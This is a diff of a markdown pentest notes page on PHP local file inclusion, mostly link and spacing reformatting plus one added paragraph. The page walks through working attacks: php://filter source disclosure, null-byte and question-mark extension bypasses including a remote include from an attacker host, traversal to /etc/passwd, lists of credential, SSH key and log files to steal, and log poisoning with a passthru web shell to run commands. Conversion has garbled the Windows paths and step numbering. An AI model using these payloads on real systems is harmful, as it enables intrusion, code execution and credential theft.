@@ -4,29 +4,25 @@ Local file inclusion means unauthorized access to filesystem.
 
 With this we can get a hold of many sensitive files
 
-
-
 In most web-services that use a database we can get a hold of the database username and password:
 
-
-in wordpress the file is **wp-config.php**
+in wordpress the file is **wp-config.php**  
 And once you have gotten access to that you can do other things. Check out the chapter on mysql.
 
+This is the definitive guide to Local File inclusion  
+[https://highon.coffee/blog/lfi-cheat-sheet/](https://highon.coffee/blog/lfi-cheat-sheet/)
 
-This is the definitive guide to Local File inclusion
-https://highon.coffee/blog/lfi-cheat-sheet/
-
-And this
-http://securityidiots.com/Web-Pentest/LFI
+And this  
+[http://securityidiots.com/Web-Pentest/LFI](http://securityidiots.com/Web-Pentest/LFI)
 
 And this:
 
-https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
-
+[https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)
 
 The vulnerability stems from unsanitized user-input
 
 Here is an example of php-code vulnerable to LFI. As you can see we just pass in the url-parameter into the require-function without any sanitization. So the user can just add the path to any file.
+
 ```
 # index.php
     <?php
@@ -42,15 +38,16 @@ So if you an LFI you might have notices that you can read txt-files but not .php
 ```
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index
 ```
+
 Here you use a php-filter to convert it all into base64. So in return you get the whole page base64 encoded. Now you only need to decode it. Save the base64-text into a file and then run:
 
 ```
 base64 -d savefile.php
 ```
 
-### Using the nullbyte handeling .php
+### Bypassing .php and other extra file-endings
 
-THe nullbyte techniqu works in versions below php 5.3. So look out for that.
+The nullbyte technique works in versions below php 5.3. So look out for that.
 
 If the include looks like this:
 
@@ -64,6 +61,10 @@ If the include looks like this:
 
 The php i added to the filename, this will mean that we will not be able to find the files we are looking for. Since the file /etc/passwd.php does not exist. However, if we add the nullbyte to the end of our attack-string the **.php** will not be taken into account. So we add **%00** to the end of our attackstring.
 
+As noted above this wll only work for php below 5.3. So another way to deal with it is just to add a question mark.This way the stuff after gets interpreted as a paramter and therefore excluded.
+
+`http://example.com/page=http://192.168.1.101/maliciousfile.txt?`
+
 ## Linux
 
 ### Tricks
@@ -74,7 +75,7 @@ Check if a folder exists, go into it and the go out.
 index.php?page=../../../../../../var/www/dossierexistant/../../../../../etc/passwd%00"
 ```
 
-**Download config-files in a nice style-format**
+**Download config-files in a nice style-format**  
 If you read files straight in the browser the styling can becomes unbearable. Really difficult to read. A way around it is to download the files from the terminal. But that won't work if there is a login that is blocking it. So this is a great workaround:
 
 ```
@@ -83,12 +84,10 @@ curl -s http://example.com/login.php -c cookiefile -d "user=admin&pass=admin"
 curl -s http://example.com/gallery.php?page=/etc/passwd -b cookiefile
 ```
 
-
 ### Sensitive file
 
-This is the default layout of important apache files.
-https://wiki.apache.org/httpd/DistrosDefaultLayout
-
+This is the default layout of important apache files.  
+[https://wiki.apache.org/httpd/DistrosDefaultLayout](https://wiki.apache.org/httpd/DistrosDefaultLayout)
 
 ```
 /etc/issue (A message or system identification to be printed before the login prompt.)
@@ -102,14 +101,15 @@ https://wiki.apache.org/httpd/DistrosDefaultLayout
 $USER/.bash_history or .profile
 /root/.bash_history or .profile
 ```
-Comes from here: https://gist.github.com/sckalath/a8fd4e754a72015aa0b8
 
-/etc/mtab
-/etc/inetd.conf
+Comes from here: [https://gist.github.com/sckalath/a8fd4e754a72015aa0b8](https://gist.github.com/sckalath/a8fd4e754a72015aa0b8)
+
+/etc/mtab  
+/etc/inetd.conf  
 /var/log/dmessage
 
-
 #### Web server files
+
 ```
 # Usually found in the root of the website
 .htaccess
@@ -117,6 +117,7 @@ config.php
 ```
 
 #### SSH
+
 ```
 authorized_keys
 id_rsa
@@ -124,7 +125,9 @@ id_rsa.keystore
 id_rsa.pub
 known_hosts
 ```
+
 #### Logs
+
 ```
 /etc/httpd/logs/acces_log 
 /etc/httpd/logs/error_log 
@@ -142,6 +145,7 @@ known_hosts
 #### General files
 
 First you need to check the passwd file to find the users.
+
 ```
 cat /etc/passwd
 cat /etc/group
@@ -163,9 +167,10 @@ Found in the home-directory
 
 "Under Linux, /proc includes a directory for each running process, including kernel processes, in directories named /proc/PID, where PID is the process number. Each directory contains information about one process, including: /proc/PID/cmdline, the command that originally started the process."
 
-https://en.wikipedia.org/wiki/Procfs
+[https://en.wikipedia.org/wiki/Procfs](https://en.wikipedia.org/wiki/Procfs)
 
-https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/
+[https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/](https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/)
+
 ```
 /proc/sched_debug # Can be used to see what processes the machine is running
 /proc/mounts
@@ -178,23 +183,22 @@ https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/
 /proc/self/environ
 ```
 
-## Bruteforcing SSH known_hosts
+## Bruteforcing SSH known\_hosts
 
-https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/
-
+[https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known\_hosts-files/](https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/)
 
 ## LFI to shell
 
 Under the right circumstances you might be able to get a shell from a LFI
 
-
 ### Log files
+
 There are some requirements. We need to be able to read the apache2 log files, either the success.log or the error.log
 
 So once you have found a LFI vuln you have to inject php-code into the log file and then execute it.
 
 1. Insert php-code into the log file.
-This can be done with nc or telnet.
+   This can be done with nc or telnet.
 
 ```
 nc 192.168.1.102 80
@@ -212,8 +216,8 @@ Host: 192.168.1.102
 Connection: close
 ```
 
-
 Or in the referer parameter.
+
 ```
 GET / HTTP/1.1
 Referer: <? passthru($_GET[cmd]) ?>
@@ -221,55 +225,57 @@ Host: 192.168.1.159
 Connection: close
 ```
 
-2. Execute it
-In the browser:
-```
-http://192.168.1.102/index.php?/var/log/apache2/access.log&cmd=id
-```
+1. Execute it
+   In the browser:
+   ```
+   http://192.168.1.102/index.php?/var/log/apache2/access.log&cmd=id
+   ```
+
 
 ### /proc/self/environ
 
 We can also inject code into /proc/self/environ through the user-agent
 
-https://www.exploit-db.com/papers/12992/
+[https://www.exploit-db.com/papers/12992/](https://www.exploit-db.com/papers/12992/)
 
-
-
-https://www.youtube.com/watch?v=ttTVNcPnsJY
+[https://www.youtube.com/watch?v=ttTVNcPnsJY](https://www.youtube.com/watch?v=ttTVNcPnsJY)
 
 ## Windows
 
-- Fingerprinting
+* Fingerprinting
 
-    *:\boot.ini
-    *:\WINDOWS\win.ini
-    *:\WINNT\win.ini
-    *:\WINDOWS\Repair\SAM
-    *:\WINDOWS\php.ini
-    *:\WINNT\php.ini
-    *:\Program Files\Apache Group\Apache\conf\httpd.conf
-    *:\Program Files\Apache Group\Apache2\conf\httpd.conf
-    *:\Program Files\xampp\apache\conf\httpd.conf
-    *:\php\php.ini
-    *:\php5\php.ini
-    *:\php4\php.ini
-    *:\apache\php\php.ini
-    *:\xampp\apache\bin\php.ini
-    *:\home2\bin\stable\apache\php.ini
-    *:\home\bin\stable\apache\php.ini
+  _:\boot.ini  
+    _:\WINDOWS\win.ini  
+    _:\WINNT\win.ini  
+    _:\WINDOWS\Repair\SAM  
+    _:\WINDOWS\php.ini  
+    _:\WINNT\php.ini  
+    _:\Program Files\Apache Group\Apache\conf\httpd.conf  
+    _:\Program Files\Apache Group\Apache2\conf\httpd.conf  
+    _:\Program Files\xampp\apache\conf\httpd.conf  
+    _:\php\php.ini  
+    _:\php5\php.ini  
+    _:\php4\php.ini  
+    _:\apache\php\php.ini  
+    _:\xampp\apache\bin\php.ini  
+    _:\home2\bin\stable\apache\php.ini  
+    _:\home\bin\stable\apache\php.ini
 
-- Logs
+* Logs
 
-    *:\Program Files\Apache Group\Apache\logs\access.log
-    *:\Program Files\Apache Group\Apache\logs\error.log
+  _:\Program Files\Apache Group\Apache\logs\access.log  
+    _:\Program Files\Apache Group\Apache\logs\error.log
 
-- PHP Session Locations
+* PHP Session Locations
 
-    *:\WINDOWS\TEMP\
-    *:\php\sessions\
-    *:\php5\sessions\
-    *:\php4\sessions\
+  _:\WINDOWS\TEMP\  
+    _:\php\sessions\  
+    _:\php5\sessions\  
+    _:\php4\sessions\
+
 
 ## References:
-https://nets.ec/File_Inclusion
-https://gist.github.com/sckalath/da1a232f362a700ab459
+
+[https://nets.ec/File\_Inclusion](https://nets.ec/File_Inclusion)  
+[https://gist.github.com/sckalath/da1a232f362a700ab459](https://gist.github.com/sckalath/da1a232f362a700ab459)
+
